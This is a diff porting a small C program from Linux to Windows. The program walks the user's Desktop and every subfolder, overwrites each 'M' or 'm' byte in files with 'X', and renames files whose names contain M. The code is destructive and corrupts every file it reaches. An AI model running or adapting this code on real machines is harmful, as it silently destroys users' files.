@@ -3,6 +3,7 @@
 #include <dirent.h>
 #include <string.h>
 #include <sys/stat.h>
+#include <windows.h>
 
 #define PATH_MAX        4096    /* # chars in a path name including nul */
 
@@ -33,8 +34,9 @@ void convertMtoX(char *filepath){
 	while ((ch = fgetc(file)) != EOF){
 		// If the current value is an 'M' or 'm', replace it with an 'X'
 		if(ch == 'M' || ch == 'm'){
-			fseek(file, ftell(file) - 1, SEEK_SET);
+			fseek(file, ftell(file) -1 , SEEK_SET);
 			fprintf(file, "%c", 'X');
+			fseek(file, ftell(file), SEEK_SET);
 		}		
 	}
 }
@@ -78,7 +80,7 @@ void spiderDirectory(char *homeDir, DIR *d){
 	while ((dir = readdir(d)) != NULL){
 		// Get the full path associated with dir->d_name
 		strcpy(currentDir, homeDir);
-		strcat(currentDir,"/");
+		strcat(currentDir,"\\");
 		strcat(currentDir,dir->d_name);
 		
 		// If the current element of the directory is a subdirectory (and not . or ..), spider through it
@@ -104,12 +106,13 @@ void spiderDirectory(char *homeDir, DIR *d){
 		if(strchr(dir->d_name, 'M') != NULL || strchr(dir->d_name, 'm') != NULL){
 			// Get the new file name
 			strcpy(newFileNaXe, dir->d_name);
+			printf("%s\n", newFileNaXe);
 			findAndReplaceMs(newFileNaXe);
-
 			// Construct a new valid filepath with the converted name
 			strcpy(newFilePath, homeDir);
-			strcat(newFilePath, "/");
+			strcat(newFilePath, "\\");
 			strcat(newFilePath, newFileNaXe);
+			printf("%s\n", newFilePath);
 
 			// Rename the file
 			rename(currentDir, newFilePath);
@@ -124,13 +127,12 @@ Main Function
 **********************************************************************************/
 int main(int argc, char*argv[]) {
 	DIR *d;
-	char *homedir = getenv("HOME");
-
+	char *homedir = getenv("USERPROFILE");
+	printf("%s\n", homedir);
 	// Get the Desktop path if user is using Linux
-	strcat(homedir,"/Desktop");
+	strcat(homedir,"\\Desktop");
 
 	// TODO: Get Desktop path if user is using Windows/iOS
-
 	// Look through the desktop and all of its subdirectories for word documents, and do the conversion XtoM
 	d = opendir(homedir);
 	if (d){
